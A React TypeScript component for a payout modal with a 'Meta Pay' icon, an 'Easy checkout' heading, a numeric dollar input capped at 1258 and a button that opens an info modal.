import React from 'react';
import Modal from './Modal';
import { useTranslation } from 'react-i18next';

interface PayoutModalProps {
    isOpend: boolean;
    isOpendInfo: (value: boolean) => void;
    onTogglePayout: (value: boolean) => void;
}

const PayoutModal: React.FC<PayoutModalProps> = ({ isOpend, isOpendInfo, onTogglePayout }) => {

    const { t } = useTranslation();
    const [isOpen, setIsOpen] = React.useState(isOpend);

    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const [payout, setPayout] = React.useState<string>('');

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    const handleClose = () => {
        setIsOpen(false);
        onTogglePayout(false);
    };

    const handleOpendInfoModal = () => {
        isOpendInfo(true);
        handleClose();
    }

    return (
        <Modal
            isOpen={isOpen}
            title=""
            onClose={handleClose}
        >

            <div className='w-full'>
                <div className='w-full max-w-[135px] mx-auto'>
                    <img src="/images/icons/ic_meta_pay.svg" className='w-full' alt="" />
                </div>
                <p className='text-center text-[28px] font-[500] mt-3'>Easy checkout</p>
            </div>
            <div className="w-full my-10">
                <div className={`relative input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`}>

                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 text-sm">
                        $
                    </span>

                    <input
                        type="text"
                        inputMode="numeric"
                        min={0}
                        max={1258}
                        id='payout'
                        placeholder="0,00"
                        className="w-full outline-0 h-full tracking-wide pl-6 pr-[90px]"
                        value={payout}
                        onChange={(e) => {
                            const raw = e.target.value.replace(/,/g, '');
                            if (/^\d*$/.test(raw) && Number(raw) <= 1258) {
                                setPayout(raw);
                            }
                        }}
                    />

                    {/* max */}
                    <span className="absolute top-1/2 right-3 -translate-y-1/2 text-gray-400 text-sm">
                        / $ 1258
                    </span>
                </div>

                <div className='w-full mt-[20px] '>
                    <button onClick={handleOpendInfoModal} className='w-full h-[45px] min-h-[45px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px]'>
                        {t('modal.button_payout')}
                    </button>
                </div>
            </div>

        </Modal>
    );
};

export default PayoutModal;
